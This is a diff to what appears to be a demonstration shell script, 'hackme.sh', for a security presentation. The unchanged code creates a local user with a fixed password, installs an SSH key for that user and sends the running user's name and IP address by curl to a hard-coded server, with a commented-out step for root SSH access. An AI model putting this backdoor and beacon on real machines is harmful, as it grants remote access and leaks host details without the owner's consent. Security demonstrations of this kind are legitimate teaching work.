@@ -6,6 +6,9 @@
 # intended to harm you or your system in any way. But hey, install it only
 # at your own risk!
 
+# Don't forget to run it with 'sudo ./hackme.sh delete' after the presentation
+# to delete the created user
+
 username=lab
 pwd=4242
 host_ip=192.168.1.38
@@ -38,15 +41,11 @@ then
 	echo $key > /Local/Users/$username/.ssh/authorized_keys
 	chown $username /Local/Users/lab
 
-	# Copy some files for the demonstration
-	# cp src/laugh.wav /Local/Users/$username/laugh.wav
-
 	# Make a request so my server knows you were "hacked"
 	runner_user=`who | grep -m1 "" | cut -d " " -f1`
 	runner_ip=`ifconfig  | grep inet | grep broadcast | cut -d " " -f2`
 	url="http://$host_ip:5000?user=$runner_user=&ip=$runner_ip"
 	curl $url
-	# curl
 
 	# Grant SSH acces via ROOT [DANGER DANGER DANGER]
 	# if [ -f /var/root/.ssh/authorized_keys ]
